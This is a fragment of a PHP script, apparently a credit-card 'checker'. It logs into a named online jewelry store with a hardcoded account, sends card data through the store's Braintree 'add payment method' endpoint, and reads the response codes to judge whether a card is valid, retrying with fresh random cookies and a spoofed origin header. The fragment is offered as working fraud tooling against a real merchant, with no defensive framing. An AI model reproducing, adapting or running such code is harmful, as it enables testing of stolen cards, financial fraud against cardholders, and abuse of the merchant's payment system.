...
while ($retries < $limit && $transaction_complete == false) {
    $cookie = RandomString();
    $retries = $retries + 1;
    $PAGE = cURL(
        'https://jewelryexchange.com/my-account/',
        $headers = [
    ...
    $add_payment = cURL(
        ...
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://jewelryexchange.com/my-account/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        ...
        "username=docugs030401%40aol.com&password=asdasd123123&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2F&login=Log+in",
        "POST",
        0,
        $cookie
    );
    ...
    $edit_address = cURL(
        'https://jewelryexchange.com/my-account/edit-address/billing/',
        $headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
            "https://jewelryexchange.com/my-account/edit-address/",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "",
        "GET",
    ...
    $prepare_pm = cURL(
        'https://jewelryexchange.com/my-account/add-payment-method/',
        $headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
            "referer: https://jewelryexchange.com/my-account/edit-address/",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "",
        "GET",
    ...
    $ajax = cURL(
        "https://jewelryexchange.com/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "origin: https://mltdmics.com",
            "referer: https://jewelryexchange.com/my-account/add-payment-method/",
    ...
    $execute = cURL(
        ...
        "payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=1080.00&wc_braintree_credit_card_payment_nonce=$token&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=&wc_braintree_paypal_amount=1080.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
        "POST",
        1,
        $cookie
    );
    ...
    $dcode = strtoupper(GetStr($execute, 'Status code ', ':'));
    $response = GetStr($execute, 'Status code ' . $dcode . ': ', '</li>');
    if (strpos($execute, 'Nice! New payment method added:') || strpos($execute, 'avs')){
...
//
    ...
    } elseif ($retries >= $limit && strpos($execute,"risk")) {
        echo "Response: 'Error', Reason: '$dcode'";
        $transaction_complete = true;
    }
